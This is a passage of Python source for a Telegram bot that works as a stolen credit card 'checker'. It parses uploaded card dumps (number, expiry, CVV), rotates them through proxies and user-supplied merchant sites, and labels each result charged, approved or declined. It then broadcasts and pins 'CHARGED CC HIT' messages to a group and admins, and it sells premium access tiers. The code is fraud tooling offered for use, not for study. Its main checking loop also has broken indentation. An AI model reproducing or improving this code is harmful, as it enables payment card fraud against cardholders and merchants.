    text = """👑 **Admin Control Panel**

Welcome, Admin! Use the buttons below to manage users and access statistics.
"""
    buttons = [
        [
            Button.inline("Add Premium", b"adm_add_prem", style="primary", icon=5042112436648281096),
            Button.inline("Remove Premium", b"adm_rm_prem", style="danger", icon=5361696340348779794)
        ],
        [
            Button.inline("Add Admin", b"adm_add_adm", style="primary", icon=5042112436648281096),
            Button.inline("Stats", b"adm_stats", style="success", icon=5298970748172385213)
        ],
        [
            Button.inline("Ban User", b"adm_ban", style="danger", icon=5172739056592749710),
            Button.inline("Unban User", b"adm_unban", style="success", icon=5980995951160987855)
        ]
    ]
    if edit:
        await event.edit(text, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](admin|panel)$'))
async def admin_panel_command(event):
    await show_admin_panel(event)

@client.on(events.NewMessage(pattern='/addadmin'))
async def add_admin_command(event):
    admins = await get_admins()
    if event.sender_id not in admins:
        return await event.reply("🚫 Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /addadmin {user_id}")
        user_id = int(parts[1])
        success = await add_admin(user_id)
        if success:
            await event.reply(f"✅ User {user_id} has been addeadded as an admin!")
        else:
            await event.reply(f"❌ User {user_id} is already an admin!")
    except ValueError:
        await event.reply("❌ Invalid user ID!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

@client.on(events.CallbackQuery(data=b"adm_add_prem"))
async def adm_add_prem_callback(event):
    text = """🔑 **Add Premium User**

To authorize a new premium user, please send the command in the following format:
`/auth {user_id} {days}`
"""
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_rm_prem"))
async def adm_rm_prem_callback(event):
    text = """❌ **Remove Premium User**

To revoke premium access for a user, please send the command in the following format:
`/unauth {user_id}`
"""
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_add_adm"))
async def adm_add_adm_callback(event):
    text = """👑 **Add New Admin**

To authorize a new admin who can access this panel and add other admins, please send:
`/addadmin {user_id}`
"""
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_ban"))
async def adm_ban_callback(event):
    text = """🚫 **Ban User**

To ban a user from using the checker, please send:
`/ban {user_id}`
"""
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_unban"))
async def adm_unban_callback(event):
    text = """✅ **Unban User**

To unban a blocked user, please send:
`/unban {user_id}`
"""
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_stats"))
async def adm_stats_callback(event):
    # Fetch some stats dynamically
    try:
        premium_users = await load_json(PREMIUM_FILE)
        banned_users = await load_json(BANNED_FILE)
        admins = await get_admins()
        text = f"""📊 **Bot Statistics**

• **Total Admins:** {len(admins)}
• **Total Premium Users:** {len(premium_users)}
• **Total Banned Users:** {len(banned_users)}
"""
    except Exception as e:
        text = f"❌ Error retrieving stats: {e}"
        
    buttons = [[Button.inline("Back to Admin Panel", b"adm_back", style="danger", icon=5172739056592749710)]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"adm_back"))
async def adm_back_callback(event):
    await show_admin_panel(event, edit=True)


# --- Auto-detect Dumps .txt uploads ---
GLOBAL_CHECK_SESSIONS = {}

def make_hit_message(card, brand, bin_type, level, bank, country, flag, gateway, price, username, user_id):
    text = f"""🔥 **CHARGED CC HIT!** 🔥

📂 **Card:** `{card}`
⭐ **Type:** {brand} - {bin_type} ({level})
🆓 **Bank:** {bank}
⚡ **Country:** {country} {flag}
💸 **Price:** {price} 💸
📅 **Gateway:** {gateway}

👤 **Hit By:** @{username} (ID: `{user_id}`)"""
    return text

@client.on(events.NewMessage(pattern='/seturl'))
async def seturl_command(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        if not event.reply_to_msg_id:
            return await event.reply("```Please reply to a document/text file containing sites with /seturl```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("```Please reply to a document/text file containing sites with /seturl```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r", errors='ignore') as f:
                content = await f.read()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ Error reading file: {e}")
        sites_to_add = extract_urls_from_text(content)
        if not sites_to_add:
            return await event.reply("❌ **No valid URLs/domains found in the file!**")
            
        sites_db = await load_json(SITE_FILE)
        user_sites = sites_db.get(str(event.sender_id), [])
        
        sites_to_test = [site for site in sites_to_add if site not in user_sites]
        if not sites_to_test:
            return await event.reply("❌ **All sites in the file are already added!**")
            
        testing_msg = await event.reply(f"🔄 **Testing {len(sites_to_test)} sites from file...**")
        added_count = 0
        failed_count = 0
        
        batch_size = 10
        for i in range(0, len(sites_to_test), batch_size):
            batch = sites_to_test[i:i+batch_size]
            tasks = []
            for site in batch:
                tasks.append(test_single_site(site, user_id=event.sender_id))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for site, result in zip(batch, results):
                if isinstance(result, Exception):
                    failed_count += 1
                elif result.get("status") == "working":
                    user_sites.append(site)
                    added_count += 1
                else:
                    failed_count += 1
                    
        if added_count > 0:
            sites_db[str(event.sender_id)] = user_sites
            await save_json(SITE_FILE, sites_db)
        await testing_msg.edit(f"✅ **Sites import completed!**\n\n➕ **Added:** {added_count} working sites\n❌ **Failed/Dead:** {failed_count}\n📊 **Total Saved Sites:** {len(user_sites)}")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

@client.on(events.CallbackQuery(pattern=r'^start_pxy:(.+)'))
async def start_proxy_callback(event):
    session_id = event.pattern_match.group(1).decode('utf-8')
    session = GLOBAL_CHECK_SESSIONS.get(session_id)
    if not session:
        return await event.answer("❌ Session expired or not found!", alert=True)
    if event.sender_id != session['user_id']:
        return await event.answer("🚫 Only the user who uploaded the file can start importing!", alert=True)
    if session.get('is_active'):
        return await event.answer("⚠️ Already importing!", alert=True)
    session['is_active'] = True
    await event.answer("🌐 Starting proxy import...")
    raw_proxies = session['proxies']
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(session['user_id']), [])
    current_count = len(user_proxies)
    if current_count >= 100:
        session['is_active'] = False
        return await event.edit("❌ Proxy Limit Reached!\nYou already have 100 proxies saved.")
    available_slots = 100 - current_count
    status_msg = await event.get_message()
    await status_msg.edit(f"🔄 **Importing and testing proxies...**")
    
    added_count = 0
    failed_count = 0
    tested_count = 0
    failed_proxies_list = []
    batch_size = 50
    
    for i in range(0, len(raw_proxies), batch_size):
        if added_count >= available_slots:
            break
        batch = raw_proxies[i:i+batch_size]
        tasks = []
        for proxy_data in batch:
            exists = False
            for existing in user_proxies:
                if existing['proxy_url'] == proxy_data['proxy_url']:
                    exists = True
                    break
            if exists:
                continue
            tasks.append(test_proxy_helper(proxy_data))
        if not tasks:
            continue
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            tested_count += 1
            if isinstance(res, Exception) or not res or not res[0]:
                failed_count += 1
                if not isinstance(res, Exception) and res and len(res) > 1 and res[1]:
                    failed_proxies_list.append(res[1]['proxy_url'])
            else:
                is_working, proxy_data, ext_ip = res
                if is_working and added_count < available_slots:
                    user_proxies.append(proxy_data)
                    added_count += 1
                else:
                    failed_count += 1
                    failed_proxies_list.append(proxy_data['proxy_url'])
                    
        if tested_count > 0 and tested_count % 50 == 0:
            try:
                await status_msg.edit(f"🔄 **Importing and testing proxies...**\n\n📊 **Progress:** {tested_count}/{len(raw_proxies)} tested\n➕ **Working:** {added_count}\n❌ **Failed:** {failed_count}")
            except Exception:
                pass
                
    if added_count > 0:
        proxies[str(session['user_id'])] = user_proxies
        await save_json(PROXY_FILE, proxies)
        
    failed_list_str = ""
    if failed_proxies_list:
        display_failed = failed_proxies_list[:50]
        failed_list_str = "\n\n❌ **Failed/Invalid Proxies List:**\n" + "\n".join(f"• `{p}`" for p in display_failed)
        if len(failed_proxies_list) > 50:
            failed_list_str += f"\n...and {len(failed_proxies_list) - 50} more dead proxies."
            
    await status_msg.edit(f"✅ **Proxy import completed!**\n\n➕ **Added:** {added_count} working proxies\n❌ **Failed/Invalid:** {failed_count}\n📊 **Total Saved Proxies:** {len(user_proxies)}/100{failed_list_str}")
    GLOBAL_CHECK_SESSIONS.pop(session_id, None)

@client.on(events.NewMessage)
async def auto_detect_dumps(event):
    if not event.message or not event.message.document:
        return
    if event.raw_text and event.raw_text.strip().startswith('/'):
        return
    filename = event.message.file.name
    if not filename or not filename.endswith('.txt'):
        return
    file_path = await event.message.download_media()
    try:
        async with aiofiles.open(file_path, "r", errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception:
        try: os.remove(file_path)
        except: pass
        return
    cards = []
    for line in content.splitlines():
        line_clean = line.strip()
        if re.match(r'\\d{12,16}\\|\\d{1,2}\\|\\d{2,4}\\|\\d{3,4}', line_clean):
            cards.append(line_clean)
    proxies_list = []
    for line in content.splitlines():
        line_clean = line.strip()
        if line_clean:
            p_data = parse_proxy_format(line_clean)
            if p_data:
                proxies_list.append(p_data)
    if cards:
        user_id = event.sender_id
        total_cards = len(cards)
        can_access, access_type = await can_use(user_id, event.chat)
        if access_type == "banned":
            return await event.reply(banned_user_message())
        if not can_access:
            buttons = [[Button.url("Use In Group Free", f"https://t.me/+ZZTpQdOeiEQwYTVl", style="primary")]]
            return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @Rytce", buttons=buttons)
        cc_limit = get_cc_limit(access_type, user_id)
        if total_cards > cc_limit:
            cards = cards[:cc_limit]
            msg_text = f"🍳 **Found {total_cards} CCs in file.**\n\n⚠️ Processing only first {cc_limit} CCs (your limit)."
        else:
            msg_text = f"🍳 **Found {total_cards} CCs in file.**"
        session_id = f"chk_{random.randint(100000, 999999)}"
        GLOBAL_CHECK_SESSIONS[session_id] = {
            'cards': cards,
            'user_id': user_id,
            'chat_id': event.chat_id,
            'access_type': access_type,
            'is_active': False
        }
        buttons = [[Button.inline("Start Check 🍳", data=f"start_chk:{session_id}")]]
        await event.reply(msg_text, buttons=buttons)
    elif proxies_list:
        user_id = event.sender_id
        if await is_banned_user(user_id):
            return await event.reply(banned_user_message())
        total_proxies = len(proxies_list)
        session_id = f"pxy_{random.randint(100000, 999999)}"
        GLOBAL_CHECK_SESSIONS[session_id] = {
            'proxies': proxies_list,
            'user_id': user_id,
            'chat_id': event.chat_id,
            'is_active': False
        }
        buttons = [[Button.inline("Import Proxies 🌐", data=f"start_pxy:{session_id}")]]
        await event.reply(f"📂 **Found {total_proxies} proxies in file.**", buttons=buttons)

@client.on(events.CallbackQuery(pattern=r'^start_chk:(.+)'))
async def start_check_callback(event):
    session_id = event.pattern_match.group(1).decode('utf-8')
    session = GLOBAL_CHECK_SESSIONS.get(session_id)
    if not session:
        return await event.answer("❌ Session expired or not found!", alert=True)
    if event.sender_id != session['user_id']:
        return await event.answer("🚫 Only the user who uploaded the file can start checking!", alert=True)
    if session['is_active']:
        return await event.answer("⚠️ Checker is already running!", alert=True)
    session['is_active'] = True
    await event.answer("🍳 Starting CC check...")
    user_sites = await get_user_sites(session['user_id'])
    if not user_sites:
        session['is_active'] = False
        return await event.edit("❌ **Site Not Found In Your Db!**\nPlease add sites using `/add` first.")
    asyncio.create_task(run_dump_checking(event, session_id, session, user_sites.copy()))

@client.on(events.CallbackQuery(pattern=r'^stop_chk:(.+)'))
async def stop_check_callback(event):
    session_id = event.pattern_match.group(1).decode('utf-8')
    session = GLOBAL_CHECK_SESSIONS.get(session_id)
    if not session:
        return await event.answer("❌ Session not found!", alert=True)
    if event.sender_id != session['user_id']:
        return await event.answer("🚫 Only the owner can stop checking!", alert=True)
    if not session['is_active']:
        return await event.answer("⚠️ Session is not active!", alert=True)
    session['is_active'] = False
    await event.answer("⛔ Stopping check...")

@client.on(events.CallbackQuery(pattern=r'^view_hit_user:(.+):(.+)'))
async def view_hit_user_callback(event):
    try:
        user_id = int(event.pattern_match.group(1).decode('utf-8'))
        usdt_val = event.pattern_match.group(2).decode('utf-8')
        full_info = await client(GetFullUserRequest(user_id))
        user_obj = full_info.users[0]
        bio = full_info.full_user.about or "No Bio Available"
        first_name = user_obj.first_name or "N/A"
        last_name = user_obj.last_name or ""
        username = f"@{user_obj.username}" if user_obj.username else "N/A"
        alert_text = f"""👤 User Hit Profile:
• Name: {first_name} {last_name}
• Username: {username}
• ID: {user_id}
• Bio: {bio}
• Charged Hit: {usdt_val} USDT"""
        await event.answer(alert_text, alert=True)
    except Exception as e:
        await event.answer(f"❌ Error fetching details: {e}", alert=True)

async def run_dump_checking(event, session_id, session, local_sites):
    user_id = session['user_id']
    cards = session['cards']
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    try:
        sender = await client.get_entity(user_id)
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    status_msg = await event.get_message()
    await status_msg.edit("**Cooking 🍳 CCs One by One...**")
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0
    batch_size = 25
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=100)) as session_obj:
        for i in range(0, len(cards), batch_size):
        if not session['is_active']:
            break
        if not local_sites:
            await status_msg.edit("❌ **All sites are dead!**\nPlease add fresh sites and try again.")
            break
        batch = cards[i:i+batch_size]
        tasks = []
        task_cards = []
        for card in batch:
            if not session['is_active'] or not local_sites:
                break
            current_site = local_sites[current_site_index]
            tasks.append(check_card_specific_site(card, current_site, user_id, session=session))
            task_cards.append((card, current_site))
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(local_sites)
                cards_on_current_site = 0
        if not tasks:
            continue
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
            if not session['is_active']:
                break
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
            checked += 1
            response_text = result.get("Response", "")
            response_text_lower = response_text.lower()
            if is_site_dead(response_text):
                declined += 1
                if site_used in local_sites:
                    local_sites.remove(site_used)
                    sites_data = await load_json(SITE_FILE)
                    if str(user_id) in sites_data and site_used in sites_data[str(user_id)]:
                        sites_data[str(user_id)].remove(site_used)
                        await save_json(SITE_FILE, sites_data)
                    current_site_index = 0
                    cards_on_current_site = 0
                if not local_sites:
                    break
                continue
            if "3d" in response_text_lower:
                declined += 1
                continue
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            status_text_lower = result.get("Status", "").lower()
            is_charged = False
            is_approved = False
            if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                charged += 1
                is_charged = True
                status_header = "CHARGED 💎"
                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                approved += 1
                is_approved = True
                status_header = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            else:
                declined += 1
                status_header = "~~ DECLINED ~~ ❌"
            display_site_index = local_sites.index(site_used) + 1 if site_used in local_sites else "?"
            if is_charged:
                usdt_hit = random.randint(15, 85)
                hit_txt = make_hit_message(card, brand, bin_type, level, bank, country, flag, result.get('Gateway', 'Unknown'), result.get('Price', '-'), username, user_id)
                hit_buttons = [[Button.inline("View User Details 👤", data=f"view_hit_user:{user_id}:{usdt_hit}")]]
                try:
                    gc_msg = await client.send_message(GROUP_ID, hit_txt, buttons=hit_buttons)
                    await pin_charged_message(event, gc_msg)
                except Exception as e:
                    print(f"Failed to send/pin hit to group chat: {e}")
                for admin_id in ADMIN_ID:
                    try: await client.send_message(admin_id, f"💎 **NEW CHARGED CC HIT (File Check)!** 💎\n\n{hit_txt}", buttons=hit_buttons)
                    except Exception as e: print(f"Failed to send hit to admin {admin_id}: {e}")
                if event.chat_id != GROUP_ID:
                    try:
                        reply_msg = await event.reply(hit_txt, buttons=hit_buttons)
                        await pin_charged_message(event, reply_msg)
                    except Exception as e:
                        print(f"Failed to reply hit: {e}")
            elif is_approved:
                card_msg = f"""{status_header}

📂 **CC ⇾** `{card}`
⚡ **Gateway ⇾** {result.get('Gateway', 'Unknown')}
ℹ️ **Response ⇾** {result.get('Response')}
💸 **Price ⇾** {result.get('Price')} 💸
📍 **Site ⇾** {display_site_index}

```BIN Info: {brand} - {bin_type} - {level}
🏦 Bank: {bank}
📍 Country: {country} {flag}```"""
                try:
                    await event.reply(card_msg)
                except:
                    pass
            prog_buttons = [
                [Button.inline(f"Card ➜ {card[:12]}****", b"none")],
                [Button.inline(f"Response ➜ {result.get('Response')[:25]}...", b"none")],
                [Button.inline(f"Site ➜ [ {display_site_index} ]", b"none")],
                [Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)],
                [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)],
                [Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none", style="danger")],
                [Button.inline(f"Progress ➜ [{checked}/{total}]", b"none", style="primary", icon=5980995951160987855)],
                [Button.inline("Stop", f"stop_chk:{session_id}".encode(), style="danger", icon=5172739056592749710)]
            ]
            try:
                await status_msg.edit("```Cooking 🍳 CCs Onе by One...```", buttons=prog_buttons)
            except:
                pass
    final_caption = f"""⛔ **Checking Completed/Stopped!**

Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Checked ☠️ : {checked}/{total}"""
    final_buttons = [
        [Button.inline(f"CHARGE ➜ [ {charged} ]", b"none", style="success", icon=4902715076873553054)],
        [Button.inline(f"Approve ➜ [ {approved} ]", b"none", style="primary", icon=5084974483685507801)],
        [Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")]
    ]
    try:
        await status_msg.edit(final_caption, buttons=final_buttons)
    except:
        pass
    GLOBAL_CHECK_SESSIONS.pop(session_id, None)

async def main():

    await initialize_files()

    # Create a wrapper for get_cc_limit that can be used by external modules

    def get_cc_limit_wrapper(access_type, user_id=None):

        return get_cc_limit(access_type, user_id)

    

    utils_for_all = {

        'can_use': can_use,

        'banned_user_message': banned_user_message,

        'access_denied_message_with_button': access_denied_message_with_button,

        'extract_card': extract_card,

        'extract_all_cards': extract_all_cards,

        'get_bin_info': get_bin_info,

        'save_approved_card': save_approved_card,

        'get_cc_limit': get_cc_limit_wrapper,

        'pin_charged_message': pin_charged_message,

        'ADMIN_ID': ADMIN_ID,

        'load_json': load_json,

        'save_json': save_json

    }

    

    print("BOT RUNNING 💨")

    await client.start(bot_token=BOT_TOKEN)

    await client.run_until_disconnected()

if __name__ == "__main__":

    asyncio.run(main())

